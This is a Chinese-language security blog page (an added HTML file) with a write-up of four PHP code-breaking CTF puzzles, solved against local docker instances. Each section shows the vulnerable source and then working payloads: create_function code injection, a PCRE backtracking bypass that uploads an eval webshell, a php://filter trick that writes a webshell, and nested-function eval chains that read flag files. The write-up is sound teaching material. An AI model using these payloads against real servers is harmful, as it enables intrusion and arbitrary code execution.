@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          code-breaking write-up - 信息安全个人wiki&amp;blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>信息安全个人WIKI&amp;BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+<li><a href="/about">About</a></li>
+<li><a href="/note">Notes</a></li>
+</ul>
+<h1 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a><strong>web安全</strong></h1><h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><ul>
+<li><a href="/contents/xss">WebSecurity-xss</a></li>
+<li><a href="/contents/csrf">WebSecurity-csrf</a></li>
+<li><a href="/contents/ssrf">WebSecurity-ssrf</a></li>
+<li><a href="/contents/FI">WebSecurity-FI</a></li>
+<li><a href="/contents/rce">WebSecurity-rce</a></li>
+<li><a href="/contents/upload">WebSecurity-upload</a></li>
+<li><a href="/contents/xxe">WebSecurity-xxe</a></li>
+</ul>
+<h2 id="labs"><a href="#labs" class="headerlink" title="labs"></a>labs</h2><ul>
+<li><a href="/contents/xsslabs">xss-demo项目练习</a></li>
+<li><a href="/contents/sqllabs">sql-labs项目练习</a></li>
+<li><a href="/contents/uploadlabs">upload-labs系列write-up</a></li>
+<li><a href="/contents/code-breaking">code-breaking write-up</a></li>
+</ul>
+<h2 id="CTF-amp-AWD"><a href="#CTF-amp-AWD" class="headerlink" title="CTF&amp;AWD"></a>CTF&amp;AWD</h2><ul>
+<li><a href="/contents/awd">百越杯AWD攻防源码复现分析</a></li>
+<li><a href="/contents/jarvis">Jarvis oj web部分write-up</a></li>
+<li><a href="/contents/babyphp">hacklu_CTF2018 write up</a></li>
+<li><a href="/contents/suctf">suctf招新赛web全题解</a></li>
+<li><a href="/contents/shanghai">骇极杯CTF Write up</a></li>
+<li><a href="/contents/wangding">2018网鼎杯web部分write-up合集</a></li>
+</ul>
+<h2 id="实战-amp-总结"><a href="#实战-amp-总结" class="headerlink" title="实战&amp;总结"></a>实战&amp;总结</h2><ul>
+<li><a href="/contents/login">登录框渗透总结</a></li>
+<li><a href="/contents/logic">登录逻辑漏洞总结</a></li>
+<li><a href="/contents/unauthorized">未授权访问渗透总结</a></li>
+<li><a href="/contents/mysql-fileread">mysql客户端读取漏洞</a></li>
+</ul>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a><strong>内网渗透</strong></h1><ul>
+<li>待补充</li>
+</ul>
+<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a><strong>代码审计</strong></h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><ul>
+<li><a href="/contents/variable">代码审计基础之变量覆盖漏洞</a></li>
+<li><a href="/contents/injection">代码审计基础之命令注入函数</a></li>
+<li><a href="/contents/serialize">代码审计基础之php反序列化</a></li>
+</ul>
+<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><ul>
+<li>待补充</li>
+</ul>
+<h1 id="安全开发"><a href="#安全开发" class="headerlink" title="安全开发"></a><strong>安全开发</strong></h1><ul>
+<li><a href="/contents/tools">一些工具的使用命令</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <p>p神可以说是很用心了 <a id="more"></a></p>
+<p>由于p神题目上线的时候在考试 一直拖到现在才对几道比较简单的题目进行复现</p>
+<p>本机用的docker复现</p>
+<h2 id="0x01-easy-function"><a href="#0x01-easy-function" class="headerlink" title="0x01 easy-function"></a>0x01 easy-function</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一道绕过过滤的题，从上往下看进行理解</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>??&#39;&#39;</code>是一个三目运算符，有输入则取输入的值，没输入则取空</p>
+<p>问题的关键所在就是要绕过下面这个过滤，从而执行<code>$action(&#39;&#39;, $arg);</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)</span><br><span class="line">其中 /i不区分大小写</span><br><span class="line">    /s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[\f\n\r\t\v]</span><br><span class="line">    /D如果使用$限制结尾字符,则不允许结尾有换行;</span><br></pre></td></tr></table></figure>
+
+<p>而这里规定了action中不能有数字，字母，各种符号，想通过单纯的构造肯定不行，那么我们想想会不会有个字符可以绕过这个限制呢，这里用burp和python测试均可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">	tmp=hex(i)[<span class="number">2</span>:]</span><br><span class="line">	<span class="comment">#print(tmp)</span></span><br><span class="line">	<span class="keyword">if</span> len(tmp)&lt;<span class="number">2</span>:</span><br><span class="line">		tmp=<span class="string">'0'</span>+hex(i)[<span class="number">2</span>:]</span><br><span class="line">	tmp=<span class="string">'%'</span>+tmp</span><br><span class="line">	<span class="comment">#print(tmp)</span></span><br><span class="line">	url=<span class="string">"http://127.0.0.1:8087/?action="</span>+tmp+<span class="string">"var_dump&amp;arg=223"</span></span><br><span class="line">	data=requests.get(url=url)</span><br><span class="line">	<span class="comment">#print(url)</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">"223"</span> <span class="keyword">in</span> data.text:</span><br><span class="line">		print(data.text)</span><br><span class="line">		print(url)</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">string(<span class="number">3</span>) <span class="string">"223"</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1:8087/?action=%5cvar_dump&amp;arg=223</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>%5c</code>可以绕过这个匹配而<code>%5c</code>刚好是<code>\反斜杠</code>，刚好p神在小密圈也说了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">code-breaking puzzles第一题，function，为什么函数前面可以加一个%5c？</span><br><span class="line">其实简单的不行，php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。</span><br><span class="line">如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</span><br></pre></td></tr></table></figure>
+
+<p>然后就是需要找一个第二个参数可以引发危险的函数。<code>create_function</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php函数 create_function()：</span><br><span class="line">string create_function(string $args,string $code）</span><br><span class="line">string $args 变量部分</span><br><span class="line">string $code 方法代码部分</span><br></pre></td></tr></table></figure>
+
+<p>而这个函数可以进行代码注入</p>
+<p>例如我们输入的值为<code>?action=/create_function&amp;arg=return&quot;123&quot;;}phpinfo();/*</code></p>
+<p>其代码部分变成了如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">functiontest($a,$b)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span><span class="string">"123"</span>;</span><br><span class="line">&#125;</span><br><span class="line">phpinfo();</span><br><span class="line"><span class="comment">/*&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样便可以实现命令执行</p>
+<p>最后得到payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;arg&#x3D;123;&#125;print_r(scandir(&#39;..&#x2F;&#39;));&#x2F;*  得到flag_h0w2execute_arb1trary_c0de </span><br><span class="line">&amp;arg&#x3D;123;&#125;print_r(file_get_contents(&quot;..&#x2F;flag_h0w2execute_arb1trary_c0de&quot;));&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<p>get <code>flag{03fdc0ee2fc464aac3c40ef0e20dcb5a}</code></p>
+<h2 id="0x02-easy-pcrewaf"><a href="#0x02-easy-pcrewaf" class="headerlink" title="0x02 easy-pcrewaf"></a>0x02 easy-pcrewaf</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一个典型的上传题，通过post发包上传，服务器那边取ip的md5值作为路径，而最重要的部分则是绕过<code>is_php</code></p>
+<p>中对内容的判断，想上传一个马肯定少不了 POST eval啥的关键字，但是全被正则waf掉了</p>
+<p>这里参照<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">ph神的解析</a>对利用回溯次数溢出来绕过，贴下<code>pyaload</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">files=&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="string">'file'</span>:BytesIO(<span class="string">b'comical&lt;?php eval($_POST[cmd]);//'</span>+<span class="string">b'a'</span>*<span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(<span class="string">'http://127.0.0.1:8088'</span>,files=files,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">print(response.headers)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-easy-phpmagic"><a href="#0x03-easy-phpmagic" class="headerlink" title="0x03 easy-phpmagic"></a>0x03 easy-phpmagic</h2><p>这题讲道理一开始并没有看懂是什么意思，因为并没有发现源码，后来提示说<code>$_GET[&#39;read-source&#39;]</code>拿到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line"></span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span><br><span class="line">                $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br><span class="line">                $output = shell_exec($command);</span><br><span class="line"></span><br><span class="line">                $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line"></span><br><span class="line">                $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line">                <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">                    file_put_contents($log_name, $output);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> $output;</span><br><span class="line">			<span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中涉及到几个关键的地方</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">md5($_SERVER[&#39;REMOTE_ADDR&#39;])		&#x2F;&#x2F;对访问者的ip进行md5加密</span><br><span class="line">sprintf(&quot;dig -t A -q %s&quot;, escapeshellarg($domain));  &#x2F;&#x2F;把domian传进来的值通过dig命令打印出来</span><br><span class="line">shell_exec($command);				&#x2F;&#x2F;调用系统函数(但其实并不是这里getflag)</span><br><span class="line">$_SERVER[&#39;SERVER_NAME&#39;]				&#x2F;&#x2F;取到访问者的host值</span><br><span class="line">if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION)....   &#x2F;&#x2F;对拼接后的log_name进行后缀检测</span><br><span class="line">file_put_contents($log_name, $output);  &#x2F;&#x2F;把output的内容写入log_name这个文件中</span><br></pre></td></tr></table></figure>
+
+<p>那么这里我们可控的只有<code>dig</code>的目标和<code>log_name</code></p>
+<p>几个考点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.file_put_contents支持php协议base64decode写入文件</span><br><span class="line">2.test.php&#x2F;.就会直接调用到test.php</span><br></pre></td></tr></table></figure>
+
+<p>看到这里便可以构造出写马的poc了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">domain&#x3D;PD9waHAgZXZhbCgkX1BPU1RbeF0pOy8qKj8+&#x2F;&#x2F;&lt;?php eval($_POST[x]);&#x2F;**?&gt; base64decode后</span><br><span class="line">log&#x3D;hp:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;comical.php&#x2F;.</span><br><span class="line">host:p</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/code-breaking_1.png" alt="img"></p>
+<p>然后我们看到已经生成了我们写入的一句话马</p>
+<p><img src="/img/code-breaking_2.png" alt="img"></p>
+<p>最后得到flag，真是骚操作= =</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x&#x3D;print_r(scandir(&#39;..&#x2F;..&#x2F;..&#x2F;&#39;));             </span><br><span class="line">x&#x3D;print_r(file_get_contents(&#39;..&#x2F;..&#x2F;..&#x2F;flag_phpmag1c_ur1&#39;));</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-easy-phplimit"><a href="#0x04-easy-phplimit" class="headerlink" title="0x04 easy-phplimit"></a>0x04 easy-phplimit</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里主要的限制就是正则，并且我们得让其匹配完之后变成分号<code>；</code></p>
+<p>首先我们来分析一下这个正则<code>&#39;/[^\W]+\((?R)?\)/&#39;</code></p>
+<p>我们将其拆分为<code>[^\W]+</code>和<code>\(</code>和<code>(?R)?</code>和<code>\)</code></p>
+<p>其中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">^	匹配输入字符串的开始位置，除非在方括号表达式中使用，此时它表示不接受该字符集合。</span><br><span class="line">\w  匹配字母或数字或下划线或汉字 等价于 ‘[A-Za-z0-9_]’。 </span><br><span class="line">\W  匹配不属于\w中的字符</span><br></pre></td></tr></table></figure>
+
+<p>也就是说这里有双重否定 就是匹配字母或数字或下划线或汉字多个</p>
+<p>然后后面跟上一个括号，括号内的正则为<code>(?R)?</code>这个正则查了很多资料没查到，但看wp是</p>
+<p>限制了只允许多重嵌套函数的方式，并且最里面的函数不允许添加参数。</p>
+<p>那么我们这里只能通过进行嵌套函数执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars</span><br><span class="line">返回由所有已定义变量所组成的数组</span><br></pre></td></tr></table></figure>
+
+<p>开始测试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8084/index.php?code=var_dump(get_defined_vars());</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  [<span class="string">"_GET"</span>]=&gt;</span><br><span class="line">  <span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    [<span class="string">"code"</span>]=&gt;</span><br><span class="line">    string(<span class="number">29</span>) <span class="string">"var_dump(get_defined_vars());"</span></span><br><span class="line">  &#125;</span><br><span class="line">  [<span class="string">"_POST"</span>]=&gt;</span><br><span class="line">  <span class="keyword">array</span>(<span class="number">0</span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [<span class="string">"_COOKIE"</span>]=&gt;</span><br><span class="line">  <span class="keyword">array</span>(<span class="number">0</span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [<span class="string">"_FILES"</span>]=&gt;</span><br><span class="line">  <span class="keyword">array</span>(<span class="number">0</span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里再介绍两个函数<code>next</code>和<code>current</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next 	将数组中的内部指针向前移动一位current 函数返回数组中的当前元素的值。</span><br></pre></td></tr></table></figure>
+
+<p>接着测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8084&#x2F;index.php?code&#x3D;var_dump(current(get_defined_vars()));</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [&quot;code&quot;]&#x3D;&gt;</span><br><span class="line">  string(38) &quot;var_dump(current(get_defined_vars()));&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到返回了get那个包里的值，那么我们可以多传几个参数试试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;var_dump(current(get_defined_vars()));&amp;comical&#x3D;echo% 111</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [&quot;code&quot;]&#x3D;&gt;</span><br><span class="line">  string(38) &quot;var_dump(current(get_defined_vars()));&quot;</span><br><span class="line">  [&quot;comical&quot;]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;echo 111&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>next</code>移到下一个位去，并尝试用<code>eval</code>执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;eval(next(current(get_defined_vars())));&amp;comical&#x3D;echo% 111;</span><br><span class="line">返回了111</span><br></pre></td></tr></table></figure>
+
+<p>那么我们可以用和上面一样的方法<code>print_r</code>和<code>scandir</code>和<code>file_get_contents</code>便可以得到flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="keyword">eval</span>(next(current(get_defined_vars())));&amp;comical=print_r(scandir(<span class="string">"../"</span>));</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; .</span><br><span class="line">    [<span class="number">1</span>] =&gt; ..</span><br><span class="line">    [<span class="number">2</span>] =&gt; flag_phpbyp4ss</span><br><span class="line">    [<span class="number">3</span>] =&gt; html</span><br><span class="line">)</span><br><span class="line">code=<span class="keyword">eval</span>(next(current(get_defined_vars())));&amp;comical=print_r(file_get_contents(<span class="string">"../flag_phpbyp4ss"</span>));</span><br><span class="line">flag&#123;e86963ba34687d269b9faf526ce68cd7&#125;</span><br></pre></td></tr></table></figure>
+
+<p>bingo!</p>
+<p>还有其他大佬的做法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /?code=<span class="keyword">eval</span>(hex2bin(session_id(session_start())));</span><br><span class="line"></span><br><span class="line">PHPSESSID=<span class="number">7072696e745</span>f722866696c655f6765745f636f6e74656e747328272e2e2f666c61675f7068706279703473732729293b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure>
+
